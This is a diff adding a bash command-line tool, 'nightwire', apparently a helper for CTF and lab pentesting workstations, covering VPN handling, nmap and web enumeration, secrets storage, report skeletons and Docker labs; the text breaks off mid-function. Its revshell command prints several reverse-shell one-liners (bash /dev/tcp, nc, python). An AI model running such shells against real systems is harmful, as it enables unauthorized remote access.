@@ -1,0 +1,877 @@
+#!/usr/bin/env bash
+set -Eeuo pipefail
+
+BASE_DIR="${NIGHTWIRE_BASE:-/usr/local/share/nightwire}"
+WORKSPACE_ROOT="${NIGHTWIRE_WORKSPACE:-${HOME}/ctf}"
+if [[ -f "$BASE_DIR/workspace-root" ]]; then
+  configured_root="$(cat "$BASE_DIR/workspace-root" 2>/dev/null || true)"
+  if [[ -n "$configured_root" && "$configured_root" == "$HOME"* ]]; then
+    WORKSPACE_ROOT="$configured_root"
+  fi
+fi
+
+usage() {
+  cat <<'USAGE'
+Usage: nightwire <command> [args]
+
+Commands:
+  doctor [--json]         Check core tools, paths, Docker, VMware tools, and templates.
+  update [--upgrade]      Update package metadata and user-level CTF toolchains.
+  reconfigure             Re-apply managed shell/desktop config (refresh after an update).
+  new NAME                Create a structured CTF workspace.
+  vpn up FILE|down|status Connect/disconnect a lab VPN and show the tun0 address.
+  target [IP [HOST]]      Pin the current box; HOST is added to /etc/hosts.
+  ip                      Show local, VPN (tun0), and target addresses.
+  banner                  Print the workstation context banner.
+  enum [TARGET]           nmap all-ports + service scan into the workspace.
+  web URL [WORDLIST]      Content discovery (feroxbuster/ffuf) into the workspace.
+  revshell [LHOST [PORT]] Print reverse-shell one-liners (LHOST defaults to tun0).
+  paths                   Print important Nightwire paths.
+  uninstall [--yes]       Remove nightwire files and restore managed config backups.
+  secrets set|get|list|remove
+                          Manage local API keys in a 0600 env file.
+  report NAME             Generate Markdown/HTML report skeleton from a workspace.
+  cache prepare DIR       Prepare an offline cache bundle directory.
+  snapshot-note LABEL     Write a VMware snapshot reminder/state note.
+  pwn-debuggers install|switch NAME
+                          Install or select pwndbg/gef/peda GDB helpers.
+  labs list|catalog|up|down|ps|logs
+                          Manage local-only vulnerable Docker labs.
+  browser-proxy [NAME]    Create/update a Firefox proxy profile helper.
+  browser-ca CERT         Import a Burp/ZAP CA into Firefox profiles using certutil.
+  browser-import FILE [PROFILE]
+                          Copy a proxy/extension config into a Firefox profile directory.
+  wordlists [pattern]     Find likely wordlists.
+  scan TARGET             Run a conservative authorized nmap scan.
+  serve [PORT]            Serve the current directory over HTTP.
+  listen PORT             Start a netcat listener.
+
+This command is for authorized CTF, lab, and owned systems only.
+USAGE
+}
+
+die() {
+  printf 'nightwire: %s\n' "$*" >&2
+  exit 1
+}
+
+need() {
+  command -v "$1" >/dev/null 2>&1 || die "missing command: $1"
+}
+
+json_escape() {
+  printf '%s' "$1" | sed 's/\\/\\\\/g; s/"/\\"/g'
+}
+
+sudo_if_needed() {
+  if [[ "${EUID:-$(id -u)}" -eq 0 ]]; then
+    "$@"
+  else
+    sudo "$@"
+  fi
+}
+
+cmd_paths() {
+  cat <<EOF
+base=$BASE_DIR
+workspace=$WORKSPACE_ROOT
+templates=$BASE_DIR/templates
+labs=$BASE_DIR/labs
+browser=$BASE_DIR/browser
+tool_lists=$BASE_DIR/tool-lists
+EOF
+}
+
+state_dir() {
+  printf '%s\n' "${NIGHTWIRE_STATE:-$HOME/.config/nightwire}"
+}
+
+target_file() {
+  printf '%s/target\n' "$(state_dir)"
+}
+
+# Best-effort IPv4 of an interface. Always returns 0 (empty when absent) so it is
+# safe inside the prompt/status helpers under `set -o pipefail`.
+iface_ip() {
+  ip -4 -o addr show "${1:-tun0}" 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | head -n1 || true
+}
+
+target_ip() {
+  local file
+  file="$(target_file)"
+  [[ -f "$file" ]] || return 0
+  sed -n 's/^IP=//p' "$file" | head -n1 || true
+}
+
+cmd_vpn() {
+  local action="${1:-status}"
+  shift || true
+  case "$action" in
+    up)
+      local conf="${1:-}"
+      [[ -f "$conf" ]] || die "usage: nightwire vpn up FILE.ovpn"
+      need openvpn
+      printf 'Authorized-use reminder: connect only to lab/CTF VPNs you are permitted to use.\n'
+      sudo_if_needed openvpn --config "$conf" --daemon nightwire-vpn --writepid /run/nightwire-vpn.pid
+      printf 'openvpn started in the background. Check: nightwire vpn status\n'
+      ;;
+    down)
+      if [[ -f /run/nightwire-vpn.pid ]]; then
+        sudo_if_needed kill "$(cat /run/nightwire-vpn.pid)" 2>/dev/null || true
+      fi
+      sudo_if_needed pkill -f 'openvpn --config' 2>/dev/null || true
+      printf 'vpn down\n'
+      ;;
+    status | "")
+      local tun
+      tun="$(iface_ip tun0)"
+      if [[ -n "$tun" ]]; then printf 'tun0: %s\n' "$tun"; else printf 'tun0: not connected\n'; fi
+      ;;
+    *)
+      die "usage: nightwire vpn up FILE|down|status"
+      ;;
+  esac
+}
+
+cmd_target() {
+  local action="${1:-show}"
+  local file
+  file="$(target_file)"
+  mkdir -p "$(dirname "$file")"
+
+  case "$action" in
+    show | "")
+      if [[ -f "$file" ]]; then cat "$file"; else printf 'no target set\n'; fi
+      ;;
+    clear)
+      rm -f "$file"
+      printf 'target cleared\n'
+      ;;
+    *)
+      local ip="$action"
+      local host="${2:-}"
+      [[ "$ip" =~ ^[0-9A-Za-z:._-]+$ ]] || die "invalid target: $ip"
+      {
+        printf 'IP=%s\n' "$ip"
+        [[ -n "$host" ]] && printf 'HOST=%s\n' "$host"
+      } >"$file"
+      if [[ -n "$host" ]]; then
+        # Pass ip/host as positional args (not interpolated) and match the host
+        # as a literal whole word, so hostnames cannot inject sed/shell syntax.
+        sudo_if_needed sh -c '
+          ip="$1"; host="$2"; tmp="$(mktemp)"
+          grep -Fvw "$host" /etc/hosts > "$tmp" 2>/dev/null || true
+          printf "%s\t%s\n" "$ip" "$host" >> "$tmp"
+          cat "$tmp" > /etc/hosts
+          rm -f "$tmp"
+        ' _ "$ip" "$host"
+        printf 'target set: %s (%s); /etc/hosts updated. Use: export IP=$(nightwire _target-ip)\n' "$ip" "$host"
+      else
+        printf 'target set: %s. Use: export IP=$(nightwire _target-ip)\n' "$ip"
+      fi
+      ;;
+  esac
+}
+
+cmd_ip() {
+  printf 'Interfaces:\n'
+  ip -4 -o addr show 2>/dev/null | awk '{printf "  %-10s %s\n", $2, $4}' || true
+  local tun tgt
+  tun="$(iface_ip tun0)"
+  tgt="$(target_ip)"
+  [[ -n "$tun" ]] && printf 'VPN (tun0): %s\n' "$tun"
+  [[ -n "$tgt" ]] && printf 'Target:     %s\n' "$tgt"
+  return 0
+}
+
+cmd_banner() {
+  local distro="unknown"
+  if [[ -r /etc/os-release ]]; then
+    # shellcheck disable=SC1091
+    distro="$(. /etc/os-release && printf '%s' "${PRETTY_NAME:-$ID}")"
+  fi
+  local lan tun tgt
+  lan="$(ip -4 -o route get 1.1.1.1 2>/dev/null | sed -n 's/.*src \([0-9.]*\).*/\1/p' | head -n1 || true)"
+  tun="$(iface_ip tun0)"
+  tgt="$(target_ip)"
+  printf '\n  \033[1;36mnightwire\033[0m  %s\n' "$distro"
+  printf '  host %s    lan %s    vpn %s\n' "$(hostname)" "${lan:-none}" "${tun:-none}"
+  printf '  target %s    workspace %s\n\n' "${tgt:-none}" "$WORKSPACE_ROOT"
+}
+
+cmd_tmux_status() {
+  local tun tgt out=""
+  tun="$(iface_ip tun0)"
+  tgt="$(target_ip)"
+  [[ -n "$tun" ]] && out="vpn ${tun}"
+  [[ -n "$tgt" ]] && out="${out:+$out  }tgt ${tgt}"
+  printf '%s' "$out"
+}
+
+cmd_reconfigure() {
+  local installer="$BASE_DIR/installer/install.sh"
+  [[ -x "$installer" ]] || die "staged installer not found ($installer); re-run the original install.sh"
+  printf 'Refreshing Nightwire shell/desktop config...\n'
+  sudo_if_needed "$installer" --only shell,desktop --yes "$@"
+}
+
+default_wordlist() {
+  local candidates=(
+    /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+    /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+    /usr/share/wordlists/dirb/common.txt
+  )
+  local w
+  for w in "${candidates[@]}"; do
+    [[ -f "$w" ]] && {
+      printf '%s' "$w"
+      return 0
+    }
+  done
+  return 1
+}
+
+cmd_enum() {
+  local target="${1:-$(target_ip)}"
+  [[ -n "$target" ]] || die "usage: nightwire enum TARGET (or pin one: nightwire target IP)"
+  need nmap
+  printf 'Authorized-use reminder: enumerate only systems you are explicitly permitted to test.\n'
+
+  local safe out ports
+  safe="${target//[^A-Za-z0-9_.-]/_}"
+  out="$WORKSPACE_ROOT/$safe/scans"
+  mkdir -p "$out"
+
+  printf 'All-ports TCP scan (this can take a while)...\n'
+  nmap -Pn -p- --min-rate 2000 -oA "$out/allports" "$target" || true
+  ports="$(grep -oE '[0-9]+/open' "$out/allports.gnmap" 2>/dev/null | cut -d/ -f1 | sort -un | paste -sd, - || true)"
+  if [[ -z "$ports" ]]; then
+    printf 'No open TCP ports found. Results in %s\n' "$out"
+    return 0
+  fi
+
+  printf 'Open ports: %s\nService/script scan...\n' "$ports"
+  nmap -Pn -sC -sV -p "$ports" -oA "$out/services" "$target" || true
+  printf '\nResults in %s\n' "$out"
+  if printf ',%s,' "$ports" | grep -qE ',(80|443|8000|8080|8443),'; then
+    printf 'Web ports detected. Try: nightwire web http://%s\n' "$target"
+  fi
+}
+
+cmd_web() {
+  local url="${1:-}"
+  local wl="${2:-}"
+  [[ -n "$url" ]] || die "usage: nightwire web URL [wordlist]"
+  if [[ -z "$wl" ]]; then
+    wl="$(default_wordlist)" || die "no wordlist found; pass one explicitly"
+  fi
+  printf 'Authorized-use reminder: only scan web apps you are permitted to test.\n'
+
+  local host safe out
+  host="$(printf '%s' "$url" | sed -E 's#^https?://##; s#[:/].*##')"
+  safe="${host//[^A-Za-z0-9_.-]/_}"
+  out="$WORKSPACE_ROOT/$safe/scans"
+  mkdir -p "$out"
+
+  if command -v feroxbuster >/dev/null 2>&1; then
+    feroxbuster -u "$url" -w "$wl" -o "$out/ferox.txt"
+  elif command -v ffuf >/dev/null 2>&1; then
+    ffuf -u "${url%/}/FUZZ" -w "$wl" -o "$out/ffuf.json"
+  else
+    die "need feroxbuster or ffuf"
+  fi
+  printf 'Results in %s\n' "$out"
+}
+
+cmd_revshell() {
+  local lhost="${1:-$(iface_ip tun0)}"
+  local lport="${2:-4444}"
+  [[ -n "$lhost" ]] || die "usage: nightwire revshell LHOST LPORT  (LHOST defaults to tun0)"
+  local payload="bash -i >& /dev/tcp/$lhost/$lport 0>&1"
+  local b64
+  b64="$(printf '%s' "$payload" | base64 | tr -d '\n')"
+
+  printf 'Reverse shells to %s:%s (authorized testing only)\n\n' "$lhost" "$lport"
+  printf 'bash:     %s\n' "$payload"
+  printf 'bash b64: echo %s | base64 -d | bash\n' "$b64"
+  printf 'nc:       nc -e /bin/sh %s %s\n' "$lhost" "$lport"
+  printf 'nc fifo:  rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f\n' "$lhost" "$lport"
+  printf 'python3:  python3 -c '\''import socket,os,pty;s=socket.socket();s.connect(("%s",%s));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'\''\n' "$lhost" "$lport"
+  printf '\nStart a listener with: nightwire listen %s\n' "$lport"
+  if command -v xclip >/dev/null 2>&1 && [[ -n "${DISPLAY:-}" ]]; then
+    printf '%s' "$payload" | xclip -selection clipboard 2>/dev/null && printf '(bash one-liner copied to clipboard)\n' || true
+  fi
+}
+
+shell_feature_present() {
+  case "$1" in
+    zsh-autosuggestions)
+      [[ -e /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh || -d "$HOME/.oh-my-zsh/custom/plugins/zsh-autosuggestions" ]]
+      ;;
+    zsh-syntax-highlighting)
+      [[ -e /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh || -d "$HOME/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting" ]]
+      ;;
+    fzf-tab)
+      [[ -d "$HOME/.oh-my-zsh/custom/plugins/fzf-tab" ]]
+      ;;
+    blesh)
+      [[ -f "$HOME/.local/share/blesh/ble.sh" ]]
+      ;;
+    nerd-font)
+      ls "$HOME/.local/share/fonts/NerdFonts/"*.ttf >/dev/null 2>&1 ||
+        ls "$HOME/.local/share/fonts/NerdFonts/"*.otf >/dev/null 2>&1
+      ;;
+    tpm)
+      [[ -d "$HOME/.tmux/plugins/tpm" ]]
+      ;;
+    *)
+      return 1
+      ;;
+  esac
+}
+
+cmd_doctor_json() {
+  local commands=(git curl python3 pipx tmux nmap fzf zoxide eza rustscan feroxbuster nuclei subfinder httpx docker nightwire)
+  local features=(zsh-autosuggestions zsh-syntax-highlighting fzf-tab blesh nerd-font tpm)
+  local first=1
+  printf '{'
+  printf '"base":"%s",' "$(json_escape "$BASE_DIR")"
+  printf '"workspace":"%s",' "$(json_escape "$WORKSPACE_ROOT")"
+  printf '"commands":{'
+  for cmd in "${commands[@]}"; do
+    ((first)) || printf ','
+    first=0
+    if command -v "$cmd" >/dev/null 2>&1; then
+      printf '"%s":{"ok":true,"path":"%s"}' "$(json_escape "$cmd")" "$(json_escape "$(command -v "$cmd")")"
+    else
+      printf '"%s":{"ok":false,"path":""}' "$(json_escape "$cmd")"
+    fi
+  done
+  printf '},'
+  printf '"shell":{'
+  first=1
+  for feature in "${features[@]}"; do
+    ((first)) || printf ','
+    first=0
+    printf '"%s":%s' "$(json_escape "$feature")" "$(shell_feature_present "$feature" && printf true || printf false)"
+  done
+  printf '},'
+  printf '"assets":{"templates":%s,"labs":%s,"browser":%s}' \
+    "$([[ -d "$BASE_DIR/templates" ]] && printf true || printf false)" \
+    "$([[ -f "$BASE_DIR/labs/docker-compose.yml" ]] && printf true || printf false)" \
+    "$([[ -f "$BASE_DIR/browser/firefox-proxy-user.js" ]] && printf true || printf false)"
+  printf '}\n'
+}
+
+cmd_doctor() {
+  if [[ "${1:-}" == "--json" ]]; then
+    cmd_doctor_json
+    return 0
+  fi
+
+  local missing=0
+  local commands=(git curl python3 pipx tmux nmap fzf rustscan feroxbuster nuclei subfinder httpx docker)
+  printf 'Nightwire doctor\n'
+  printf 'Base: %s\n' "$BASE_DIR"
+  printf 'Workspace: %s\n\n' "$WORKSPACE_ROOT"
+
+  for cmd in "${commands[@]}"; do
+    if command -v "$cmd" >/dev/null 2>&1; then
+      printf '[ok]   %s -> %s\n' "$cmd" "$(command -v "$cmd")"
+    else
+      printf '[miss] %s\n' "$cmd"
+      missing=1
+    fi
+  done
+
+  if [[ -d /usr/share/seclists ]]; then
+    printf '[ok]   SecLists: /usr/share/seclists\n'
+  elif [[ -d /usr/share/wordlists ]]; then
+    printf '[ok]   wordlists: /usr/share/wordlists\n'
+  else
+    printf '[miss] wordlists directory\n'
+    missing=1
+  fi
+
+  if command -v systemctl >/dev/null 2>&1; then
+    systemctl is-active --quiet docker 2>/dev/null && printf '[ok]   docker service active\n' || printf '[warn] docker service not active or unavailable\n'
+    systemctl is-active --quiet vmtoolsd 2>/dev/null && printf '[ok]   vmtoolsd service active\n' || printf '[warn] vmtoolsd service not active or unavailable\n'
+  fi
+
+  [[ -x /usr/local/bin/nightwire ]] && printf '[ok]   nightwire command installed\n' || printf '[miss] nightwire command\n'
+  [[ -d "$BASE_DIR/templates" ]] && printf '[ok]   templates installed\n' || printf '[miss] templates\n'
+  [[ -f "$BASE_DIR/labs/docker-compose.yml" ]] && printf '[ok]   local lab compose installed\n' || printf '[miss] local lab compose\n'
+
+  printf '\nShell experience (autocomplete)\n'
+  shell_feature_present zsh-autosuggestions && printf '[ok]   zsh-autosuggestions present\n' || printf '[warn] zsh-autosuggestions not found\n'
+  shell_feature_present zsh-syntax-highlighting && printf '[ok]   zsh-syntax-highlighting present\n' || printf '[warn] zsh-syntax-highlighting not found\n'
+  shell_feature_present fzf-tab && printf '[ok]   fzf-tab present\n' || printf '[warn] fzf-tab not found\n'
+  shell_feature_present blesh && printf '[ok]   ble.sh (bash autosuggestions) present\n' || printf '[warn] ble.sh not found\n'
+  shell_feature_present nerd-font && printf '[ok]   Nerd Font installed\n' || printf '[warn] Nerd Font not found\n'
+  shell_feature_present tpm && printf '[ok]   tmux plugin manager present\n' || printf '[warn] tmux plugin manager not found\n'
+  command -v zoxide >/dev/null 2>&1 && printf '[ok]   zoxide present\n' || printf '[warn] zoxide not found (smart cd)\n'
+  command -v eza >/dev/null 2>&1 && printf '[ok]   eza present\n' || printf '[warn] eza not found (icon ls)\n'
+
+  return "$missing"
+}
+
+update_pipe_list() {
+  local list_file="$1"
+  local runner="$2"
+  local entry binary package
+  [[ -f "$list_file" ]] || return 0
+  while IFS= read -r entry; do
+    [[ -z "$entry" || "${entry:0:1}" == "#" ]] && continue
+    binary="${entry%%|*}"
+    package="${entry#*|}"
+    printf 'Updating %s...\n' "$binary"
+    bash -lc "$runner '$package'" || printf 'warn: update failed for %s\n' "$entry" >&2
+  done <"$list_file"
+}
+
+cmd_update() {
+  local do_upgrade=0
+  if [[ "${1:-}" == "--upgrade" ]]; then
+    do_upgrade=1
+  fi
+
+  if command -v apt-get >/dev/null 2>&1; then
+    sudo_if_needed env DEBIAN_FRONTEND=noninteractive apt-get update
+    if ((do_upgrade)); then
+      sudo_if_needed env DEBIAN_FRONTEND=noninteractive apt-get upgrade -y
+    fi
+  fi
+
+  command -v pipx >/dev/null 2>&1 && pipx upgrade-all || true
+  command -v cargo >/dev/null 2>&1 && update_pipe_list "$BASE_DIR/tool-lists/cargo-tools.txt" "cargo install" || true
+  command -v go >/dev/null 2>&1 && update_pipe_list "$BASE_DIR/tool-lists/go-tools.txt" "GOBIN=\"$HOME/go/bin\" go install" || true
+
+  if command -v gem >/dev/null 2>&1 && [[ -f "$BASE_DIR/tool-lists/gem-tools.txt" ]]; then
+    while IFS= read -r gem_name; do
+      [[ -z "$gem_name" || "${gem_name:0:1}" == "#" ]] && continue
+      gem install --user-install "$gem_name" --no-document || true
+    done <"$BASE_DIR/tool-lists/gem-tools.txt"
+  fi
+
+  if command -v git >/dev/null 2>&1 && [[ -d "$HOME/.oh-my-zsh/custom/plugins" ]]; then
+    local plugin_dir
+    for plugin_dir in "$HOME/.oh-my-zsh/custom/plugins"/*; do
+      [[ -d "$plugin_dir/.git" ]] || continue
+      printf 'Updating zsh plugin %s...\n' "$(basename "$plugin_dir")"
+      git -C "$plugin_dir" pull --ff-only --quiet || printf 'warn: update failed for %s\n' "$plugin_dir" >&2
+    done
+  fi
+
+  if command -v nuclei >/dev/null 2>&1; then
+    nuclei -update || true
+    nuclei -update-templates || true
+  fi
+}
+
+cmd_new() {
+  local name="${1:-}"
+  [[ -n "$name" ]] || die "usage: nightwire new NAME"
+  [[ "$name" != *"/"* && "$name" != *".."* ]] || die "workspace name must be a simple directory name"
+
+  local target="$WORKSPACE_ROOT/$name"
+  mkdir -p "$target"/{recon,scans,loot,notes,screenshots,exploit,files,writeup}
+  if [[ -d "$BASE_DIR/templates/workspace" ]]; then
+    cp -n "$BASE_DIR/templates/workspace/"* "$target/" 2>/dev/null || true
+  fi
+  if [[ -f "$target/notes.md" ]]; then
+    sed -i "s/{{NAME}}/$name/g; s/{{DATE}}/$(date +%F)/g" "$target/notes.md"
+  fi
+  printf '%s\n' "$target"
+}
+
+cmd_uninstall() {
+  local assume_yes=0
+  [[ "${1:-}" == "--yes" ]] && assume_yes=1
+
+  if ((assume_yes == 0)); then
+    printf 'This removes nightwire files and restores .nightwire.bak shell config backups where present. Continue? [y/N] '
+    local answer
+    read -r answer
+    case "$answer" in
+      y | Y | yes | YES) ;;
+      *) die "uninstall aborted" ;;
+    esac
+  fi
+
+  local file
+  for file in "$HOME/.bashrc" "$HOME/.zshrc" "$HOME/.inputrc" "$HOME/.tmux.conf" "$HOME/.config/xfce4/terminal/terminalrc"; do
+    if [[ -f "$file.nightwire.bak" ]]; then
+      cp -a "$file.nightwire.bak" "$file"
+      printf 'restored %s\n' "$file"
+    fi
+  done
+
+  sudo_if_needed rm -f /usr/local/bin/nightwire
+  sudo_if_needed rm -rf "$BASE_DIR"
+  printf 'nightwire uninstall complete. Packages installed by apt/pipx/cargo/go/gem were left in place.\n'
+}
+
+secrets_file() {
+  printf '%s\n' "${NIGHTWIRE_SECRETS:-$HOME/.config/nightwire/secrets.env}"
+}
+
+valid_secret_key() {
+  [[ "$1" =~ ^[A-Z][A-Z0-9_]*$ ]]
+}
+
+cmd_secrets() {
+  local action="${1:-}"
+  shift || true
+  local file
+  file="$(secrets_file)"
+  mkdir -p "$(dirname "$file")"
+  touch "$file"
+  chmod 600 "$file"
+
+  case "$action" in
+    set)
+      local key="${1:-}"
+      local value="${2:-}"
+      [[ -n "$key" && -n "$value" ]] || die "usage: nightwire secrets set KEY VALUE"
+      valid_secret_key "$key" || die "secret key must match [A-Z][A-Z0-9_]*"
+      [[ "$value" == *$'\n'* ]] && die "secret value must be a single line"
+      grep -v "^${key}=" "$file" >"$file.tmp" 2>/dev/null || true
+      printf '%s=%s\n' "$key" "$value" >>"$file.tmp"
+      mv "$file.tmp" "$file"
+      chmod 600 "$file"
+      ;;
+    get)
+      local key="${1:-}"
+      [[ -n "$key" ]] || die "usage: nightwire secrets get KEY"
+      valid_secret_key "$key" || die "secret key must match [A-Z][A-Z0-9_]*"
+      # Parse the value rather than sourcing the file (no code execution).
+      sed -n "s/^${key}=//p" "$file" | head -n1
+      ;;
+    list)
+      sed -n 's/^\([A-Z][A-Z0-9_]*\)=.*/\1/p' "$file"
+      ;;
+    remove)
+      local key="${1:-}"
+      [[ -n "$key" ]] || die "usage: nightwire secrets remove KEY"
+      grep -v "^${key}=" "$file" >"$file.tmp" || true
+      mv "$file.tmp" "$file"
+      chmod 600 "$file"
+      ;;
+    *)
+      die "usage: nightwire secrets set|get|list|remove"
+      ;;
+  esac
+}
+
+cmd_report() {
+  local name="${1:-}"
+  [[ -n "$name" ]] || die "usage: nightwire report NAME"
+  local target="$WORKSPACE_ROOT/$name"
+  [[ -d "$target" ]] || die "workspace not found: $target"
+  mkdir -p "$target/writeup"
+
+  local report="$target/writeup/report.md"
+  cat >"$report" <<EOF
+# $name Report
+
+Generated: $(date -Is)
+
+## Executive Summary
+
+## Scope
+
+$(sed -n '/^## Scope/,$p' "$target/notes.md" 2>/dev/null | sed -n '1,12p')
+
+## Enumeration
+
+$(find "$target/scans" -maxdepth 1 -type f 2>/dev/null | sed 's/^/- /' | head -50)
+
+## Findings
+
+## Exploitation
+
+## Evidence
+
+$(find "$target/screenshots" -maxdepth 1 -type f 2>/dev/null | sed 's/^/- /' | head -50)
+
+## Remediation
+
+## Appendix
+EOF
+
+  local html="$target/writeup/report.html"
+  {
+    printf '<!doctype html><html><head><meta charset="utf-8"><title>%s Report</title><style>body{font-family:system-ui,Segoe UI,sans-serif;max-width:980px;margin:40px auto;line-height:1.5;background:#0b0f14;color:#d8dee9}pre,code{background:#151d25;padding:2px 4px}a{color:#88c0d0}</style></head><body><pre>\n' "$(json_escape "$name")"
+    sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g' "$report"
+    printf '</pre></body></html>\n'
+  } >"$html"
+
+  printf '%s\n%s\n' "$report" "$html"
+}
+
+cmd_cache() {
+  local action="${1:-}"
+  local dir="${2:-}"
+  case "$action" in
+    prepare)
+      [[ -n "$dir" ]] || die "usage: nightwire cache prepare DIR"
+      mkdir -p "$dir"/{assets,manifests,tool-lists,labs,browser,templates}
+      cp -a "$BASE_DIR/assets/." "$dir/assets/" 2>/dev/null || true
+      cp -a "$BASE_DIR/manifests/." "$dir/manifests/" 2>/dev/null || true
+      cp -a "$BASE_DIR/tool-lists/." "$dir/tool-lists/" 2>/dev/null || true
+      cp -a "$BASE_DIR/labs/." "$dir/labs/" 2>/dev/null || true
+      cp -a "$BASE_DIR/browser/." "$dir/browser/" 2>/dev/null || true
+      cp -a "$BASE_DIR/templates/." "$dir/templates/" 2>/dev/null || true
+      if command -v docker >/dev/null 2>&1 && [[ -f "$BASE_DIR/labs/docker-compose.yml" ]]; then
+        docker compose -p nightwire-labs -f "$BASE_DIR/labs/docker-compose.yml" pull || true
+      fi
+
+      # Mirror the shell/tmux git dependencies and the Nerd Font so an airgapped
+      # box can install with: ./install.sh --cache-dir DIR
+      mkdir -p "$dir/repos" "$dir/fonts"
+      if command -v git >/dev/null 2>&1; then
+        local repos=(
+          "ohmyzsh|https://github.com/ohmyzsh/ohmyzsh.git"
+          "zsh-autosuggestions|https://github.com/zsh-users/zsh-autosuggestions.git"
+          "zsh-syntax-highlighting|https://github.com/zsh-users/zsh-syntax-highlighting.git"
+          "zsh-completions|https://github.com/zsh-users/zsh-completions.git"
+          "fzf-tab|https://github.com/Aloxaf/fzf-tab.git"
+          "tpm|https://github.com/tmux-plugins/tpm"
+          "nordic-theme|https://github.com/EliverLara/Nordic.git"
+          "nordzy-cursors|https://github.com/alvatip/Nordzy-cursors.git"
+        )
+        local repo name url
+        for repo in "${repos[@]}"; do
+          name="${repo%%|*}"
+          url="${repo#*|}"
+          [[ -d "$dir/repos/$name" ]] || git clone --depth 1 "$url" "$dir/repos/$name" || printf 'warn: cache clone failed: %s\n' "$name" >&2
+        done
+        [[ -d "$dir/repos/ble.sh" ]] || git clone --recursive --depth 1 https://github.com/akinomyoga/ble.sh.git "$dir/repos/ble.sh" || printf 'warn: cache clone failed: ble.sh\n' >&2
+      fi
+      if command -v curl >/dev/null 2>&1; then
+        local nf="${NERD_FONT_NAME:-Hack}" nfv="${NERD_FONT_VERSION:-v3.2.1}"
+        [[ -f "$dir/fonts/$nf.zip" ]] || curl -fsSL "https://github.com/ryanoasis/nerd-fonts/releases/download/$nfv/$nf.zip" -o "$dir/fonts/$nf.zip" || printf 'warn: cache font download failed: %s\n' "$nf" >&2
+      fi
+
+      cat >"$dir/README.md" <<EOF
+# Nightwire Offline Cache
+
+Created: $(date -Is)
+
+Static installer assets, manifests, browser helpers, templates, and lab compose
+files, plus git mirrors (repos/) and the Nerd Font (fonts/) for the shell stack.
+
+Use it for an airgapped install:
+
+    ./install.sh --cache-dir "\$(pwd)" --no-remote-installers
+EOF
+      printf '%s\n' "$dir"
+      ;;
+    list)
+      [[ -n "$dir" ]] || die "usage: nightwire cache list DIR"
+      find "$dir" -maxdepth 3 -type f | sort
+      ;;
+    *)
+      die "usage: nightwire cache prepare|list DIR"
+      ;;
+  esac
+}
+
+cmd_snapshot_note() {
+  local label="${1:-}"
+  [[ -n "$label" ]] || die "usage: nightwire snapshot-note LABEL"
+  local safe_label="${label//[^A-Za-z0-9_.-]/_}"
+  local dir="$WORKSPACE_ROOT/_snapshots"
+  mkdir -p "$dir"
+  local file="$dir/$(date +%Y%m%d-%H%M%S)-$safe_label.md"
+  cat >"$file" <<EOF
+# Snapshot: $label
+
+Time: $(date -Is)
+VM: $(hostname)
+
+## Reminder
+
+Create a VMware snapshot now and name it: $label
+
+## State
+
+- Workspace: $WORKSPACE_ROOT
+- User: $USER
+- Kernel: $(uname -a)
+EOF
+  printf '%s\n' "$file"
+}
+
+cmd_pwn_debuggers() {
+  local action="${1:-}"
+  local name="${2:-}"
+  case "$action" in
+    install)
+      if [[ -x "$BASE_DIR/debuggers/install-debuggers.sh" ]]; then
+        "$BASE_DIR/debuggers/install-debuggers.sh"
+      else
+        die "debugger installer missing: $BASE_DIR/debuggers/install-debuggers.sh"
+      fi
+      ;;
+    switch)
+      [[ "$name" =~ ^(pwndbg|gef|peda|none)$ ]] || die "usage: nightwire pwn-debuggers switch pwndbg|gef|peda|none"
+      local gdbinit="$HOME/.gdbinit"
+      cp -a "$gdbinit" "$gdbinit.nightwire.bak" 2>/dev/null || true
+      case "$name" in
+        pwndbg) printf 'source ~/.gdb-plugins/pwndbg/gdbinit.py\n' >"$gdbinit" ;;
+        gef) printf 'source ~/.gdb-plugins/gef/gef.py\n' >"$gdbinit" ;;
+        peda) printf 'source ~/.gdb-plugins/peda/peda.py\n' >"$gdbinit" ;;
+        none) : >"$gdbinit" ;;
+      esac
+      printf 'GDB helper switched to %s\n' "$name"
+      ;;
+    *)
+      die "usage: nightwire pwn-debuggers install|switch NAME"
+      ;;
+  esac
+}
+
+cmd_labs() {
+  local action="${1:-list}"
+  local compose="$BASE_DIR/labs/docker-compose.yml"
+  [[ -f "$compose" ]] || die "lab compose file not found: $compose"
+  need docker
+
+  case "$action" in
+    list)
+      grep -E '^[[:space:]]{2}[a-zA-Z0-9_-]+:' "$compose" | sed 's/^[[:space:]]*//; s/:$//'
+      ;;
+    catalog)
+      find "$BASE_DIR/labs/catalog" -maxdepth 1 -type f \( -name '*.yml' -o -name '*.yaml' \) 2>/dev/null | sort
+      ;;
+    up)
+      docker compose -p nightwire-labs -f "$compose" up -d
+      ;;
+    down)
+      docker compose -p nightwire-labs -f "$compose" down
+      ;;
+    ps)
+      docker compose -p nightwire-labs -f "$compose" ps
+      ;;
+    logs)
+      docker compose -p nightwire-labs -f "$compose" logs -f --tail=100
+      ;;
+    *)
+      die "usage: nightwire labs list|catalog|up|down|ps|logs"
+      ;;
+  esac
+}
+
+cmd_browser_proxy() {
+  local profile_name="${1:-nightwire-proxy}"
+  local profile_dir="$HOME/.mozilla/firefox/${profile_name}"
+  mkdir -p "$profile_dir"
+  if [[ -f "$BASE_DIR/browser/firefox-proxy-user.js" ]]; then
+    cp "$BASE_DIR/browser/firefox-proxy-user.js" "$profile_dir/user.js"
+  fi
+  if command -v firefox >/dev/null 2>&1; then
+    firefox -CreateProfile "$profile_name $profile_dir" >/dev/null 2>&1 || true
+  fi
+  printf 'Firefox proxy profile helper written to %s\n' "$profile_dir"
+  printf 'Proxy defaults: 127.0.0.1:8080 for HTTP/HTTPS.\n'
+}
+
+cmd_browser_ca() {
+  local cert="${1:-}"
+  [[ -f "$cert" ]] || die "usage: nightwire browser-ca CERT"
+  need certutil
+  local profile
+  shopt -s nullglob
+  for profile in "$HOME"/.mozilla/firefox/*; do
+    [[ -d "$profile" ]] || continue
